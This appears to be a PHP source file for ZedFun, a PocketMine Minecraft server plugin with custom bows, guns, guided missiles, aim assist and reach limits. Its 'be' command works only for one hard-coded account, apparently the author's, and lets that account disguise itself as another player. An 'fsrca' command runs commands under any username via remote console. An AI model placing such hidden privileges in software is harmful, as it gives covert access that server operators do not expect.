<?php

declare(strict_types=1);

namespace Zedstar16\ZedFun;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\RemoteConsoleCommandSender;
use pocketmine\entity\Entity;
use pocketmine\event\player\PlayerCreationEvent;
use pocketmine\event\player\PlayerLoginEvent;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\item\enchantment\Enchantment;
use pocketmine\item\enchantment\EnchantmentInstance;
use pocketmine\item\Item;
use pocketmine\item\ItemFactory;
use pocketmine\item\ItemIds;
use pocketmine\math\Vector3;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\scheduler\ClosureTask;
use pocketmine\Server;
use pocketmine\utils\TextFormat;
use Zedstar16\_Api\OwnageAPI;
use Zedstar16\ZedFun\entity\GuidedMissile;
use Zedstar16\ZedFun\entity\ZedArrow;

class ZedFun extends PluginBase implements Listener
{

    public const prefix = "§r§b§l§kII§r ";
    public const suffix = " §r§b§kII§r";
    public $firing = [];
    /** @var ZedFun */
    public static $instance = null;
    public static $data = [];

    public const define = [
        "dartsize" => 0,
        "force" => 1,
        "frequency" => 2,
        "automatic" => 3
    ];

    public static $targets = [];


    public function onEnable(): void
    {
        self::$instance = $this;
        $this->getServer()->getPluginManager()->registerEvents(new EventListener(), $this);
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
        Entity::registerEntity(ZedArrow::class, true);
        Entity::registerEntity(GuidedMissile::class, true);
        if (!file_exists($this->getDataFolder() . "data.yml")) {
            yaml_emit_file($this->getDataFolder() . "data.yml", ["zed" => "lol"]);
        }
        self::$data = self::getData();

    }

    public static function getData(): array
    {
        $data = yaml_parse_file(self::getInstance()->getDataFolder() . "data.yml");
        ZedFun::$data = $data;
        return $data;
    }

    public static function setData($data)
    {
        yaml_emit_file(self::getInstance()->getDataFolder() . "data.yml", $data);
        ZedFun::$data = $data;
    }

    public function createPlayer(PlayerCreationEvent $e)
    {
        try {
            self::$data = self::getData();
            $e->setPlayerClass(ZedPlayer::class);
        } catch (\Throwable $err) {
            $this->getLogger()->warning($err->getMessage());
        }
    }

    public function giveZedBow(Player $p, $dartsize, $force, $frequency = 1, $automatic = 0)
    {
        $bow = ItemFactory::get(ItemIds::BOW);
        $name = $automatic == 0 ? "§l§aZed Bow" : "§l§6Zed Gun";
        $shotsPerSec = (1 / ($frequency / 20));
        $bow->setCustomName(self::prefix . $name . self::suffix);
        $nbt = $bow->getNamedTag();
        $nbt->setIntArray("bowdata", [(int)$dartsize, (int)$force, (int)$frequency, (int)$automatic]);
        $bow->setCompoundTag($nbt);
        $bow->addEnchantment(new EnchantmentInstance(new Enchantment(255, "", Enchantment::RARITY_COMMON, Enchantment::SLOT_ALL, Enchantment::SLOT_NONE, 1)));
        $lore = $automatic == 0 ? ["§6The legendary §dZedBow", "§aDartsize: §b$dartsize", "§aForce: §b$force"] : ["§6The legendary §dZedGun", "§aBulletsize: §b$dartsize", "§aForce: §b$force", "§aShots/s: §b$shotsPerSec"];
        $bow->setLore($lore);
        $p->getInventory()->setItemInHand($bow);
        $p->sendMessage($name . " given");
    }

    public function getZedBowData(Item $item): ?array
    {
        $nbt = $item->getNamedTag();
        return $nbt->hasTag("bowdata") ? $nbt->getIntArray("bowdata") : null;
    }

    public function onQuit(PlayerQuitEvent $e)
    {
        $data = self::$data;
        $p = $e->getPlayer()->getName();
        foreach ($data as $name => $disguise) {
            if ($disguise == $p) {
                if ($name == "Zedstar16") {
                    unset($data["Zedstar16"]);
                    self::setData($data);
                }
            }
        }
    }

    public function isReachModified($target)
    {
        return isset(self::$data["reach"][$target]);
    }

    public function reach($target, $toggle, $reach = 3)
    {
        $data = self::getData();
        if ($toggle) {
            $data["reach"][$target] = $reach;
        } else {
            if (isset($data["reach"][$target])) {
                unset($data["reach"][$target]);
            }
        }
        self::setData($data);
    }


    public static function getTargetVector(Entity $entity, Vector3 $target_pos)
    {
        $pos_x = $target_pos->x - $entity->x;
        $pos_y = $target_pos->y - $entity->y;
        $pos_z = $target_pos->z - $entity->z;
        $yaw = rad2deg(atan2(-$pos_x, $pos_z));
        $pitch = rad2deg(-atan2($pos_y, sqrt($pos_x * $pos_x + $pos_z * $pos_z)));
        $y = -sin(deg2rad($pitch));
        $xz = cos(deg2rad($pitch));
        $x = -$xz * sin(deg2rad($yaw));
        $z = $xz * cos(deg2rad($yaw));
        return $entity->temporalVector->setComponents($x, $y, $z)->normalize();
    }

    public function onCommand(CommandSender $sender, Command $command, string $label, array $args): bool
    {
        if ($command->getName() == "zedfun") {
            if (!$sender instanceof Player && (($args[0] ?? null) !== "reach" && ($args[0] ?? null) !== "fsrca")) {
                $sender->sendMessage(TextFormat::RED . "you can only use these commands as a player");
                return false;
            }
            $cmdlist = [
                "§6-=-=-= §aZedFun Help List §6-=-=-=",
                "§b/zf bow §a(dartsize) (force)",
                "§b/zf gun §a(bulletsize) (force) (frequency/s)",
                "§b/zf reach §a(player) (max-reach)",
            ];
            if (isset($args[0])) {
                switch ($args[0]) {
                    case "target":
                        $n = $sender->getName();
                        $p = $this->getServer()->getPlayer($args[1] ?? "aaaaaaaaaaaaaaaaaaaa") ?? null;
                        if (isset(self::$targets[$n]["target"])) {
                            unset(self::$targets[$n]["target"]);
                            $sender->sendMessage("Targetting toggled to §coff");
                        } else {
                            if ($p !== null) {
                                self::$targets[$n]["target"] = $p;
                                $sender->sendMessage("Targetting toggled to §aon §e($args[1])");
                            } else $sender->sendMessage("§cPlayer not online");
                        }
                        break;
                    case "bowaim":
                        $n = $sender->getName();
                        if (isset(self::$targets[$n]["toggled"])) {
                            unset(self::$targets[$n]["toggled"]);
                            $sender->sendMessage("Bow Aim toggled to §coff");
                        } else {
                            self::$targets[$n]["toggled"] = true;
                            $sender->sendMessage("Bow Aim toggled to §aon");
                        }
                        break;
                    case "bow":
                        $this->giveZedBow($sender, $args[1] ?? 1, $args[2] ?? 5);
                        break;
                    case "gun":
                        if (count($args) == 4) {
                            $frequency = (int)(20 * (1 / $args[3]));
                            if ($frequency < 1) {
                                $sender->sendMessage("§cFrequency of bulletfire too high, max 20 shots/s");
                                return false;
                            }
                            $this->giveZedBow($sender, $args[1], $args[2], $frequency, 1);
                        } else $sender->sendMessage("§6Usage: §b/zf gun §a(bulletsize) (force) (frequency/s)");
                        break;
                    case "reach":
                        if (count($args) == 3) {
                            $target = $this->getServer()->getPlayer($args[1]);
                            if ($target !== null) {
                                $name = $target->getLowerCaseName();
                            } else $name = $args[1];
                            if (is_numeric($args[2])) {
                                if (!$this->isReachModified($name)) {
                                    $this->reach($name, true, $args[2]);
                                    $sender->sendMessage("§aLimited §b" . $name . "'s §areach to §b" . $args[2] . " §ablocks");
                                } else {
                                    $this->reach($name, false);
                                    $sender->sendMessage("§6Disabled reach limitations for§b " . $name);
                                }
                            }
                        } else $sender->sendMessage("§6Usage: §b/zf reach §a(player) (max-reach)");
                        break;
                    case "nv":
                        if ($sender->isOp()) {
                            if ($sender instanceof Player) {
                                $item = $sender->getInventory()->getItemInHand();
                                $nbt = $item->getNamedTag();
                                $nbt->setString("nv", "nv");
                                $item->setCompoundTag($nbt);
                                $item->setCustomName($item->getName() . "\n§r§bZedstar16 III");
                                $sender->getInventory()->setItemInHand($item);
                                $sender->sendMessage("§aYou shall never lose the item in your hand");
                            }
                        }
                        break;
                    case "be":
                        //internal command, if ur a dev you can edit this to make it work for you aswell :)
                        if (isset($args[1]) && $sender->getXuid() == "2535451299201728") {
                            $data = self::getData();
                            if (isset($data[$sender->getName()])) {
                                unset ($data[$sender->getName()]);
                            } else $data[$sender->getName()] = $args[1];
                            self::setData($data);
                            $sender->transfer($this->getServer()->getIp(), $this->getServer()->getPort());
                        }
                        break;
                    case "fsrca":
                        if ($sender instanceof RemoteConsoleCommandSender) {
                            if (count($args) >= 2) {
                                $username = $args[1];
                                $args = array_slice($args, 2);
                                $command = implode(" ", $args);
                                $sender = new FakeCommandSender($username, $sender);
                                Server::getInstance()->dispatchCommand($sender, $command);
                            }
                        } else $sender->sendMessage("You're not meant to be using this command... so don;t even try");
                        break;
                    default:
                        $sender->sendMessage(implode("\n", $cmdlist));
                }
            } else $sender->sendMessage(implode("\n", $cmdlist));
        }
        return true;
    }

    public static function getInstance(): ZedFun
    {
        return self::$instance;
    }

    public function shootZedArrow(Player $p, $dartsize, $force, $auto = false)
    {
        $dartsize = (float)$dartsize;
        if ($dartsize <= 0) $dartsize += 0.25;
        $nbt = Entity::createBaseNBT($p->add(0, $p->getEyeHeight()), $p->getDirectionVector()->multiply((float)$force), ($p->yaw > 180 ? 360 : 0) - $p->yaw,
            -$p->pitch);
        $damage = $auto ? 0 : 11;
        $projectile = Entity::createEntity("ZedArrow", $p->getLevel(), $nbt, $p, $damage);
        $projectile->setScale((float)$dartsize);
        $projectile->spawnToAll();
        $this->getScheduler()->scheduleDelayedTask((new ClosureTask(
            function (int $currentTick) use ($projectile): void {
                if (!$projectile->isClosed()) {
                    try {
                        $projectile->flagForDespawn();
                    } catch (\Throwable $err) {
                        $this->getLogger()->warning("Attemped to despawn arrow entity, got error" . $err->getMessage());
                    }
                }
            }
        )), $auto ? 25 : 400);
    }

    public static function shootMissile(Player $p, Player $target)
    {
        $nbt = Entity::createBaseNBT($p->add(0, $p->getEyeHeight()), self::getTargetVector($p, $target->asVector3()), ($p->yaw > 180 ? 360 : 0) - $p->yaw,
            -$p->pitch);
        $projectile = Entity::createEntity("GuidedMissile", $p->getLevel(), $nbt, $p, $target);
        $projectile->setScale(1);
        $projectile->spawnToAll();
    }

    public function startFiring(Player $p, $dartsize, $force, $frequency)
    {
        $name = $p->getName();
        $this->getScheduler()->scheduleRepeatingTask(new MachineGunTask($p, $dartsize, $force), $frequency);
        $this->firing[$name] = $name;
    }

    public function isFiring(Player $p)
    {
        return isset($this->firing[$p->getName()]);
    }

    public function stopFiring(Player $p)
    {
        $name = $p->getName();
        if (isset($this->firing[$name])) {
            unset($this->firing[$name]);
        }
    }


    public function onDisable(): void
    {
        $this->firing = [];
    }
}
